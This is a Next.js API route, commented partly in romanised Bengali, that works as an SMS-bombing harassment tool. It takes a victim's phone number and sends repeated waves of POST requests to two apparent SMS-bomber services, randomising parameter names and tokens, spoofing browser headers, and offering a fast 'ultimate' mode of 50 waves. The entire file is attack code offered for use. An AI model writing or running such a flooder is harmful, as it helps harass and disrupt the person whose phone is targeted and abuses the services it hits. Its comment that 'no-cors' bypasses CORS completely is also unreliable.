// pages/api/attack.js

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method not allowed');

  let { number, amount, isUltimate } = req.body;

  // 1. Number Cleaning
  let cleanNumber = number.toString().replace(/\D/g, ''); 
  if (cleanNumber.startsWith('88')) {
    cleanNumber = cleanNumber.substring(2); 
  }

  // 2. Target Endpoints (Directly hitting the main routes)
  const targetLinks = [
    'https://nuke-sms-bomber.pages.dev/',
    'https://shadowx-sms-bomber.onrender.com/'
  ];

  const runAttack = async () => {
    const totalWaves = isUltimate ? 50 : amount; 
    const delay = isUltimate ? 400 : 1500; // Speed barano hoyeche

    for (let i = 0; i < totalWaves; i++) {
      const attackPromises = targetLinks.map(async (baseUrl) => {
        try {
          // 3. Randomized Payload (Eita hocche ashol trick)
          // Amra protibar alada alada parameter name try korbo
          const randomParams = ['number', 'phone', 'target', 'mobile', 'number_id'];
          const selectedParam = randomParams[Math.floor(Math.random() * randomParams.length)];

          const massivePayload = {
            [selectedParam]: cleanNumber, // Random parameter name
            amount: 1,
            count: 1,
            country: "BD",
            service: "whatsapp",
            msg: "Attack",
            auth: "true",
            token: Math.random().toString(36).substring(7), // Random token
            is_active: true
          };

          // 4. Request with Multiple Headers
          const response = await fetch(baseUrl, {
            method: 'POST',
            headers: { 
              'Content-Type': 'application/json',
              'Accept': 'application/json, text/plain, */*',
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
              'X-Requested-With': 'XMLHttpRequest',
              'Origin': baseUrl,
              'Referer': baseUrl,
            },
            body: JSON.stringify(massivePayload),
            mode: 'no-cors' // Bypass CORS completely
          });

          console.log(`[Wave ${i}] Hit: ${baseUrl} | Param: ${selectedParam}`);

        } catch (err) {
          console.error(`[Wave ${i}] Error: ${err.message}`);
        }
      });

      await Promise.all(attackPromises);
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  };

  runAttack();

  return res.status(200).json({ 
    success: true, 
    message: isUltimate ? "ULTIMATE ATTACK STARTED! 🚀" : "ATTACK IN PROGRESS! 🔥" 
  });
}
